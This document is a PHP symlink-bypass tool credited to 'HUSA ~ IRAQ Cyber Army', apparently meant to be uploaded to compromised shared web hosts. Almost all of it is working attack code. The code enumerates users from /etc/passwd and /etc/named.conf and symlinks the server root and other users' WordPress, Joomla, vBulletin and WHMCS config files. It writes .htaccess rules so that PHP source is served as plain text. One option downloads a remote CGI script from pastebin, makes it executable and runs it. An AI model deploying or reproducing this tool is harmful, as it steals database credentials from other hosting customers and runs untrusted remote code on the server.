ï»?<html>
<style type="text/css">
a{
        color: #000000;
        text-shadow: 0px 0px 3px #999999;
}
 </style>
<head>
<meta charset="utf-8">
<title>HUSA</title>
</head>
 
<body>
</body>
</html>
<center><h1><a> Sym ByBass v1 By HUSA </center></h1></a>
<center><h4><a> By HUSA ~ IRAQ Cyber Army </center></h4></a>
<center><table align='center' width='70%'><h3><td>
<a href="?OPT=1">User + Domain + Sym</td></a><td><a href="?OPT=2">User + Sym</a></td></h3><td>
<a href="?OPT=3">Config ( Perl )</td></a><td>
<a href="?OPT=4">Config ( PHP )</td></a></table></center>
 
<?php
error_reporting(0);
ob_start();
 function syml($usern,$pdomain)
        {
                symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
        }
$dir = "sec1";
@mkdir($dir);
if($dir){
} else {
}
$dir2 = "sec2";
@mkdir($dir2);
if($dir2){
} else {
}
$dir3 = "sec3";
@mkdir($dir3);
if($dir3){
} else {
}
$dir4 = "sec4";
@mkdir($dir4);
if($dir4){
} else {
}
$dir5 = "sec5";
@mkdir($dir5);
if($dir5){
} else {
}
$dir6 = "sec6";
@mkdir($dir6);
if($dir6){
} else {
}
$dir7 = "sec7";
@mkdir($dir7);
if($dir7){
} else {
}
 
 
 
$sec1 = "sec1/.htaccess";
$hsec1 = fopen($sec1, 'w') or die("Error: Can't open file");
$con1 = "Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
AddType txt .html
AddHandler txt .html
Options all
Options
Allow from all
Require None
Satisfy Any";
fwrite($hsec1, $con1);
fclose($hsec1);
 
 
 
$sec2 = "sec2/.htaccess";
$hsec2 = fopen($sec2, 'w') or die("Error: Can't open file");
$con2 = "Options +FollowSymLinks
DirectoryIndex seees.html
RemoveHandler .php
AddType application/octet-stream .php ";
fwrite($hsec2, $con2);
fclose($hsec2);
 
 
$sec3 = "sec3/.htaccess";
$hsec3 = fopen($sec3, 'w') or die("Error: Can't open file");
$con3 = "Options +FollowSymLinks
DirectoryIndex Index.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php";
fwrite($hsec3, $con3);
fclose($hsec3);
 
$sec4 = "sec4/.htaccess";
$hsec4 = fopen($sec4, 'w') or die("Error: Can't open file");
$con4 = "Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php";
fwrite($hsec4, $con4);
fclose($hsec4);
 
$sec5 = "sec5/.htaccess";
$hsec5 = fopen($sec5, 'w') or die("Error: Can't open file");
$con5 = "Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html";
fwrite($hsec5, $con5);
fclose($hsec5);
 
 
$sec6 = "sec6/.htaccess";
$hsec6 = fopen($sec6, 'w') or die("Error: Can't open file");
$con6 = "Options +FollowSymLinks
DirectoryIndex Sux.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html";
fwrite($hsec6, $con6);
fclose($hsec6);
 
$sec7 = "sec7/.htaccess";
$hsec7 = fopen($sec7, 'w') or die("Error: Can't open file");
$con7 = "Options Indexes FollowSymLinks
AddType text/plain .php .inc .asp .php3
Options All
Options All";
fwrite($hsec7, $con7);
fclose($hsec7);
 
 
for ($k=1;$k<8;$k++){
if("$fp$k"){
chdir('sec'.$k);
system('ln -s / 1.txt');
chdir('../');
}
else{ echo "Error";
}
}
 
 
if(isset($_REQUEST['OPT']))
{
switch ($_REQUEST['OPT'])
{
case '1';
echo "<center><table border='1' align='center' width='80%'><h3><td><a>Domains</td></a><td><a>User</a></td><td><a>Sym</a></td></h3></center>";
if(!is_file('DATA.txt')){
$named = @file("/etc/named.conf");
}else{
$named = @file("DATA.txt");
}
if(!$named)
{
 
                die ("</br></br><center><h2><a>ERROR !</a></h2></center>");
}
else
{
foreach($named as $dom){
preg_match_all('#zone "(.*)"#', $dom, $doms);
if(strlen(trim($doms[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$doms[1][0]));
echo "<tr><td><a href=http://www.".$doms[1][0]."/>".$doms[1][0]."</a></td><td>".$user['name']."</td><td><a href='sec1/1.txt/home/".$user['name']."/public_html/' >Sym1</a>~<a href='sec2/1.txt/home/".$user['name']."/public_html/' >Sym2</a>~<a href='sec3/1.txt/home/".$user['name']."/public_html/' >Sym3</a>~<a href='sec4/1.txt/home/".$user['name']."/public_html/' >Sym4</a>~<a href='sec5/1.txt/home/".$user['name']."/public_html/' >Sym5</a>~<a href='sec6/1.txt/home/".$user['name']."/public_html/' >Sym6</a>~<a href='sec7/1.txt/home/".$user['name']."/public_html/' >Sym7</a></td></tr>";
}
}
}
break;
case '2';
echo "<center><table border='1' align='center' width='80%'><h3><td><a>User</td></a><td><a>Sym</a></td></h3></center>";
$file = file('/etc/passwd');
if(!$file)
{
 
                die ("</br></br><center><h2><a>ERROR !</a></h2></center>");
}
else
{
foreach ($file as $f){
 
     $u=explode(':', $f);
     $user = $u['0'];
         echo "<tr><td>".$user."</td><td><a href='sec1/1.txt/home/".$user."/public_html/' >Sym1</a>~<a href='sec2/1.txt/home/".$user."/public_html/' >Sym2</a>~<a href='sec3/1.txt/home/".$user."/public_html/' >Sym3</a>~<a href='sec4/1.txt/home/".$user."/public_html/' >Sym4</a>~<a href='sec5/1.txt/home/".$user."/public_html/' >Sym5</a>~<a href='sec6/1.txt/home/".$user."/public_html/' >Sym6</a>~<a href='sec7/1.txt/home/".$user."/public_html/' >Sym7</a></td></tr>";
}
}
break;
case '3';
$dir = 'HUSA';
@mkdir($dir);
if($dir){
    echo '<br> HUSA Has Been Created ~';
} else {
    echo '<br> [-] Error !';
}
   $htaccess = 'http://pastebin.com/raw.php?i=XBLhdvbQ';
    $file = file_get_contents($htaccess);
    $open = fopen('HUSA/.htaccess' , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo '<br> [htaccess] => Has Been Created ~';
     } else {
         echo "<br>[+] Error !";
     }
    $con = 'http://pastebin.com/raw.php?i=sk8JEgq0';
    $file = file_get_contents($con);
    $open = fopen('HUSA/con.cpc' , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo '<br> [cgi] => Has Been Created !';
     } else {
         echo '<br>[-] Error !';
     }
 
 
    $ch = 'HUSA/con.cpc';
        chmod($ch, 0755);
        if($cgip){
            echo '<br>[+] => CHMOD To 755 Complate ~';
        } else {
        }
 
echo ('<meta http-equiv="refresh" content="0; url=HUSA/con.cpc" />');
echo ('Please Whait . ');
 
break;
case '4';
mkdir("CONHUSA");
                                        chdir("CONHUSA");
                                        $temp = "";
                                        $val1 = 0;
                                        $val2 = 1000;
                                        for(;$val1 <= $val2;$val1++)
                                        {
                                                $uid = @posix_getpwuid($val1);
                                                if ($uid)
                                                        $temp .= join(':',$uid)."
";
                                         }
                                         echo '<br/>';
                                         $temp = trim($temp);
                                         
                                         $file5 = fopen("HUSATMP.txt","w");
                                         fputs($file5,$temp);
                                         fclose($file5);
                                         
                                         $file = fopen("HUSATMP.txt", "r") or exit("Unable to open file!");
                                         while(!feof($file))
                                         {
                                                $s = fgets($file);
                                                $matches = array();
                                                $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                                                $matches = str_replace("home/","",$matches[1]);
                                                if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                                                        continue;
                                                syml($matches,$matches);
                                         }
                                        fclose($file);
 
$ht = 'Options Indexes FollowSymLinks
Options +Indexes
AddType txt .php
AddHandler txt .php';
    $open2 = fopen('.htaccess' , 'w');
    fwrite($open2,$ht);
    fclose($open2);
                                        echo "</table>";
                                        unlink("HUSATMP.txt");
                                        echo ('<meta http-equiv="refresh" content="0; url=CONHUSA" />');
                               
break;
}
} else {
echo "</br>";
echo "</br>";
echo "<center> By HUSA AND IRAQ Cyber Army </center>"; }
?>